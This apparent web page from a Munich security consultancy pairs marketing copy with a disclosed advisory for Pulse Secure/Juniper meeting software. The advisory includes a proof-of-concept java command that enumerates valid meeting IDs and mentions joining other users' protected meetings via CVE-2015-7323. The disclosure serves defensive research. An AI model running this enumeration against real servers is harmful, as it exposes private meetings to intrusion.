# **Identify** your vulnerabilities

## before others do …

# **Secure?** For Sure!

![Expresse](/assets/images/expresse.jpg)

**Nowadays** itâs incredibly hard to imagine companies are not relying on IT-systems as they, most of the time secretly in the background, fulfill important tasks. From office networks or internet portals for clients and partners up to highly-specified assembly lines in factories, IT systems and their services enable employers to work more efficient.

Even business critical processes depend more and more on smoothly flowing IT services. Most of the time this is accomplished by using a broad set of different IT products and technologies. Besides high availability of these services, particularly the security of processed data is important. Needless to say, no company wants to see their confidential information in the hands of someone else.

How can we permanently maintain a level of highest security? And just as important, how can one make sure that current security is adequate?

Profundis Labs is an IT Security company based in Munich Germany. We provide consulting services and technical assessments like [**Penetration Tests**](/services/penetrationtest) and [**Security Audits**](/services/audit) to actively check the security of your company data. Furthermore our consulting service is independent of manufacturers and weâll make your employees become more aware to the issue of security.

=================
https://kb.pulsesecure.net/articles/Pulse\_Security\_Advisories/SA40053
Vulnerability Details:
======================
It is possible to obtain valid meeting ids.
It is possible to systematically try possible meeting IDs. Regarding the response of the
web server the user can get knowledge, if the meeting ID exists and/or is still valid
PoC code(s):
============
Example how to use the java fat client to check wether a meeting id exists or not:
java -classpath /usr/lib/jvm/java-7-oracle/jre/lib/plugin.jar:~/.juniper\_networks/meetingAppSun.jar SecureMeetingApplication ivehost PARAM\_D locale de log\_level 1 meeting\_type 0 Parameter0 "meeting\_id=PARAM\_A;user\_name=xxx;cert\_md5=PARAM\_B;ncp\_read\_timeout=90;password=;meeting\_url=;mobile\_meeting\_url=" uploadlog 1 home\_dir "/home/..." user\_agent "Mozilla/5.0" neoteris-dsid "DSID=PARAM\_C"
PARAM\_A = meeting ID
PARAM\_B = md5 hash of the SSL-certifificate of Junos Pulse server
PARAM\_C = a valid sessionID
PARAM\_D = the domain/IP of the Junos Pulse server
Depending on the validity of the meeting id, the server response is as followed:
- The meeting that you are trying to join has ended
- The meeting that you are trying to join does not exist
- If the meeting id exists, the meeting client will join the meeting (due to CVE-2015-7323 it is possible to join protected meetings of other users)
